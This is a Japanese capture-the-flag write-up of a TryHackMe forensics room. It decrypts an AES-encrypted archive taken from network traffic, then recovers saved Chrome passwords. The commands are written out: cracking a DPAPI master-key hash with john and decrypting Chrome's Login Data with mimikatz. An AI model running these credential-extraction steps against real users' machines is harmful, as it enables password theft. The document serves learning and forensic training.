# Chrome CTF

https://tryhackme.com/room/chrome

wiresharkでtransfer.exe, encrypted ファイルをエクスポート。

逆コンパイル

```cs
public class Program
{
	private static void Main()
	{
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes("PjoM95MpBdz85Kk7ewcXSLWCoAr7mRj1");
			byte[] bytes2 = Encoding.UTF8.GetBytes("lR3soZqkaWZ9ojTX");
			string path = "C:\\Users\\hadri\\Downloads\\files.zip";
			byte[] array = File.ReadAllBytes(path);
			byte[] bytes3;
			using (Aes aes = Aes.Create())
			{
				aes.Key = bytes;
				aes.IV = bytes2;
				ICryptoTransform transform = aes.CreateEncryptor(aes.Key, aes.IV);
				using MemoryStream memoryStream = new MemoryStream();
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
				{
					cryptoStream.Write(array, 0, array.Length);
				}
				bytes3 = memoryStream.ToArray();
			}
			string path2 = "C:\\Users\\hadri\\Downloads\\encrypted_files";
			File.WriteAllBytes(path2, bytes3);
			Console.WriteLine("File encrypted and saved successfully.");
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
	}
}
```

キーとIVがわかったので復号できる。

```python
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def decrypt_file(input_path, output_path, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    with open(input_path, 'rb') as f:
        encrypted_data = f.read()

    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

    with open(output_path, 'wb') as f:
        f.write(decrypted_data)

key = b"PjoM95MpBdz85Kk7ewcXSLWCoAr7mRj1"
iv = b"lR3soZqkaWZ9ojTX"
input_file = "encrypted_files"
output_file = "decrypted_files.zip"

try:
    decrypt_file(input_file, output_file, key, iv)
    print(f"復号が完了しました: {output_file}")
except Exception as e:
    print(f"エラーが発生しました: {e}")
```

zipを展開したらAppData フォルダが出てきた。  
ルーム名からして、Chromeフォルダから情報を得るのが目的だと思われる。

```sh
$ tree
.
├── Local
│   └── Google
│       ├── Chrome
│       │   └── User Data
│       │       ├── Default
│       │       │   ├── Feature Engagement Tracker
│       │       │   │   └── EventDB
│       │       │   │       ├── LOG
│       │       │   │       └── LOG.old
│       │       │   ├── GCM Store
│       │       │   │   └── Encryption
│       │       │   │       ├── 000003.log
│       │       │   │       ├── CURRENT
│       │       │   │       ├── LOCK
│       │       │   │       ├── LOG
│       │       │   │       ├── LOG.old
│       │       │   │       └── MANIFEST-000001
│       │       │   ├── GPUCache
│       │       │   │   ├── data_0
│       │       │   │   ├── data_1
│       │       │   │   ├── data_2
│       │       │   │   ├── data_3
│       │       │   │   └── index
...
```

`Login Data` ファイルをSQLiteファイルとしてロード。

Loginsテーブル。

```
https://mysecuresite.thm/			Administrator				https://mysecuresite.thm/	13316047325140704	0	0	3	0					0	0		1	0		13316047325140704
https://worksite.thm/			chrome				https://worksite.thm/	13316047349254727	0	0	3	0					0	0		2	0		13316047349254727
```

パスワード値はBlobになっていて読めない。  
調べたところ、`Local State` に含まれる（暗号化された）キーを使って復号可能だが、そのキーを復号するには基本的に保存したWindowsPCで実行しなければならないと理解した。どうすればよいか？

全くわからずウォークスルーを見た。

まず、DPAPI が TPM を使うのはオプションであり、TPMが使われずに暗号化されたものは、別のPCでも復号できる可能性がある。その点を誤解していた。

ハッシュからWindowsログインパスワードを得る。

```sh
$ DPAPImk2john -mk AppData/Roaming/Microsoft/Protect/S-1-5-21-3854677062-280096443-3674533662-1001/8c6b6187-8eaa-48bd-be16-98212a441580 -c local -S S-1-5-21-3854677062-280096443-3674533662-1001 > mkhash

$ john mkhash --wordlist=/usr/share/wordlists/rockyou.txt
```

Windowsパスワードを使ってDPAPIのマスターキーを得る。  
（Wine環境ではエラーになり、Windows環境で実行する必要があった）

```sh
mimikatz # dpapi::masterkey /in:"AppData/Roaming/Microsoft/Protect/S-1-5-21-3854677062-280096443-3674533662-1001/8c6b6187-8eaa-48bd-be16-98212a441580" /sid:S-1-5-21-3854677062-280096443-3674533662-1001 /password:[PASSWORD]

...

[masterkey] with password: [REDACTED] (normal user)
  key : ca4387eb[REDACTED]
  sha1: 217522c457cfe8a95da45da81d6b898080e2067d
```

`Local State` ファイルからChromeの暗号化キーを抽出する。

```sh
$ cat AppData/Local/Google/Chrome/User\ Data/Local\ State | jq .os_crypt.encrypted_key -r
RFBBUEkBAAAA0Iyd3wEV0[REDACTED]
```

DPAPIのマスターキーとChromeの暗号化キーを使ってChromeの機密情報を復号する。

```sh
mimikatz # dpapi::chrome /in:"AppData/Local/Google/Chrome/User Data/Default/Login Data" /masterkey:ca4387eb0a[REDACTED] /encryptedKey:RFBBUEkBAAAA0[REDACTED]
> Encrypted Key seems to be protected by DPAPI
 * volatile cache: GUID:{8c6b6187-8eaa-48bd-be16-98212a441580};KeyHash:217522c457cfe8a95da45da81d6b898080e2067d;Key:available
 * masterkey     : ca4387eb0a71fc0eea23e27f54b9ae240379c9e82a05d6fca73ecee13ca2e0e4d98390844697d8ed10715415c56152653edf460a47b70ddb868a03ee6a3f9840
> AES Key is: 9a3094f1bfe3e19d5d039fb569d35d49ad083ac34dbcd5d9e42a506b8d4a192c

URL     : https://mysecuresite.thm/ ( https://mysecuresite.thm/ )
Username: Administrator
 * using BCrypt with AES-256-GCM
Password: [REDACTED]

URL     : https://worksite.thm/ ( https://worksite.thm/ )
Username: chrome
 * using BCrypt with AES-256-GCM
Password: [REDACTED]
```

## 振り返り

- Chrome の暗号化方式と、WindowsのDPAPIについてなんの知識もなかったので非常に勉強になった。
- DPAPI に関して、[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) というツールがある（というメモ）

## Tags

#tags:Windows #tags:DPAPI #tags:Chrome
